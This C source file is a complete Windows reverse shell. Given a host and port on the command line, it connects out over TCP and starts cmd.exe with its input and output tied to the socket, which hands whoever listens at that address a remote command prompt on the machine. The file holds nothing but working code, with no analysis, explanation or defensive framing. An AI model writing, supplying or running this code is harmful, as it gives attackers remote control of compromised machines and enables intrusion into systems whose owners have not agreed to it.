#define WIN32_LEAN_AND_MEAN

#include <unistd.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        printf("Usage: ./reverse_shell <host> <port>\n");
        return 1;
    }

    // Server info
    char *host = argv[1];
    int port = atoi(argv[2]);

    SOCKET sfd = INVALID_SOCKET;
    WSADATA wsaDATA;

    if (WSAStartup(MAKEWORD(2, 2), &wsaDATA) != 0)
    {
        printf("%s\n", "Error during WSAStartup.");
        return 1;
    }

    sfd = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if (sfd == INVALID_SOCKET)
    {
        WSACleanup();
        printf("%s\n", "Invalid socket");
        return 1;
    }

    SOCKADDR_IN skt;
    skt.sin_family = AF_INET;
    skt.sin_addr.s_addr = inet_addr(host);
    skt.sin_port = htons(port);

    int res = connect(sfd, (SOCKADDR *) &skt, sizeof(skt));
    if (res == SOCKET_ERROR)
    {
        printf("%s\n", "Error during socket connection.");
        WSACleanup();
        return 1;
    }

    printf("%s\n", "Successful connection.");

    STARTUPINFO info;
    PROCESS_INFORMATION inf;

    memset(&info, 0, sizeof(info));
    info.cb = sizeof(info);
    info.dwFlags = STARTF_USESTDHANDLES;
    info.hStdInput = (HANDLE) sfd;
    info.hStdOutput = (HANDLE) sfd;
    info.hStdError = (HANDLE) sfd;

    if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &info, &inf) == 0)
    {
        printf("%s\n", "Error during process creation.");
        return 1;
    }

    if (closesocket(sfd) == SOCKET_ERROR)
    {
        printf("%s\n", "Error during socker closure.");
        WSACleanup();
        return 1;
    }

    WSACleanup();
    return 0;
}
